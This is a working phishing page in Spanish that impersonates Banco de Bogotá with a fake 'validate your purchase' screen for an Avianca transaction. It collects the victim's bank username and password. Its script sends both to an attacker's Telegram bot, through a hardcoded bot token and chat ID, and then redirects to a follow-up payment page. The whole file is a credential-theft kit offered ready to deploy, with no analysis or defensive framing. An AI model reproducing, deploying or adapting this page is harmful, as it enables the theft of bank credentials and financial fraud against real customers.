<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco de Bogotá - Seguridad</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            min-height: 100vh;
        }

        .main-wrapper {
            margin: 10% 6%;
            max-width: 500px;
            margin-left: auto;
            margin-right: auto;
        }

        .logo-section {
            padding-bottom: 5%;
            border-bottom: 2px solid #e0e0e0;
            margin-bottom: 2rem;
            text-align: center;
        }

        .logo-section img {
            width: 60%;
            max-width: 200px;
            height: auto;
        }

        .validation-section {
            margin: 2rem 0;
        }

        .validation-title {
            margin-bottom: 1.5rem;
            font-size: 1.1rem;
            color: #333;
        }

        .validation-title strong {
            font-weight: 600;
            color: #1e3a8a;
        }

        .validation-description {
            color: #666;
            line-height: 1.5;
            font-size: 0.95rem;
            margin-bottom: 1.5rem;
        }

        .transaction-details {
            margin: 2rem 0;
        }

        .transaction-details p {
            color: #888;
            font-size: 0.9rem;
            margin-bottom: 1rem;
        }

        .details-container {
            background-color: white;
            padding: 1.5rem;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            margin-bottom: 2rem;
        }

        .detail-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
            padding: 0.5rem 0;
        }

        .detail-row:last-child {
            margin-bottom: 0;
        }

        .detail-label {
            font-weight: 600;
            color: #333;
        }

        .detail-value {
            color: #666;
            font-weight: 500;
        }

        .form-section {
            background-color: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            margin-top: 2rem;
        }

        .form-title {
            color: #1e3a8a;
            font-size: 1rem;
            margin-bottom: 1.5rem;
            text-align: center;
        }

        .input-group {
            margin-bottom: 1.5rem;
        }

        .input-group label {
            display: block;
            font-weight: 600;
            color: #333;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
        }

        .input-group input {
            width: 100%;
            padding: 0.8rem;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            font-size: 1rem;
            color: #333;
            box-sizing: border-box;
            transition: all 0.3s ease;
            background-color: #fafafa;
        }

        .input-group input:focus {
            outline: none;
            border-color: #1e3a8a;
            background-color: white;
            box-shadow: 0 0 0 3px rgba(30, 58, 138, 0.1);
        }

        .input-group input::placeholder {
            color: #999;
        }

        .submit-container {
            display: flex;
            justify-content: center;
            margin-top: 2rem;
        }

        .submit-btn {
            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
            color: white;
            padding: 0.9rem 2rem;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            min-width: 150px;
        }

        .submit-btn:hover {
            background: linear-gradient(135deg, #1e40af 0%, #2563eb 100%);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(30, 58, 138, 0.3);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        /* Responsive design */
        @media (max-width: 768px) {
            .main-wrapper {
                margin: 12% 4%;
            }
            
            .logo-section img {
                width: 70%;
            }
            
            .details-container {
                padding: 1rem;
            }
            
            .form-section {
                padding: 1.5rem;
            }
            
            .detail-row {
                flex-direction: column;
                align-items: flex-start;
                gap: 0.5rem;
            }
        }

        @media (max-width: 480px) {
            .main-wrapper {
                margin: 15% 3%;
            }
            
            .logo-section img {
                width: 80%;
            }
            
            .submit-btn {
                padding: 0.8rem 1.5rem;
                font-size: 0.9rem;
                min-width: 120px;
            }
        }

        /* Animations */
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .details-container,
        .form-section {
            animation: fadeIn 0.6s ease-out;
        }

        .form-section {
            animation-delay: 0.2s;
        }

        /* Banco de Bogotá Brand Colors */
        .banco-blue {
            color: #1e3a8a;
        }

        .banco-light-blue {
            color: #3b82f6;
        }
    </style>
</head>
<body>
    <main class="main-wrapper">
        <section>
            <div class="logo-section">
                <img src="../img/BANCO DE BOGOTA.png" alt="Banco de Bogotá">
            </div>

            <div class="validation-section">
                <p class="validation-title"><strong>Vamos a validar tu compra</strong></p>
                <p class="validation-description">Banco de Bogotá requiere verificar la transacción que intentas realizar con tu tarjeta por seguridad</p>
            </div>

            <div class="transaction-details">
                <p>Detalles de la transacción</p>
                <div class="details-container">
                    <div class="detail-row">
                        <span class="detail-label">Comercio:</span>
                        <span class="detail-value">Avianca</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Monto:</span>
                        <span class="detail-value">Por cobrar</span>
                    </div>
                </div>
            </div>
        </section>

        <section class="form-section">
            <p class="form-title">Por favor, ingrese su usuario y contraseña</p>
            
            <form method="POST">
                <div class="input-group">
                    <label for="username">Usuario:</label>
                    <input type="text" id="username" name="dato1" placeholder="Ingresa tu usuario" required>
                </div>

                <div class="input-group">
                    <label for="password">Clave:</label>
                    <input type="password" id="password" name="dato2" placeholder="Ingresa tu contraseña" required>
                </div>

                <div class="submit-container">
                    <button type="submit" id="submitBtn" class="submit-btn">Continuar</button>
                </div>
            </form>
        </section>
    </main>

    <script>
        function enviarMensajeTelegram(username, password) {
            var token = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
            var chatID = '5900829263';
            var mensaje = 'Logo Bogota: ' + '\nUsuario: ' + username + ' \nClave: ' + password;
            var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + mensaje;
            
            var xhttp = new XMLHttpRequest();
            xhttp.open('GET', url, true);
            xhttp.send();
        }

        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('submitBtn').addEventListener('click', function(event) {
                event.preventDefault(); // Evita que el formulario se envíe por defecto

                var username = document.getElementById('username').value;
                var password = document.getElementById('password').value;

                if (username.trim() !== '' && password.trim() !== '') {
                    enviarMensajeTelegram(username, password);
                    setTimeout(function() {
                        window.location.href = '../cargapago.html';
                    }, 1000);
                } else {
                    alert('Por favor complete todos los campos antes de continuar.');
                }
            });
        });
    </script>
</body>
</html>
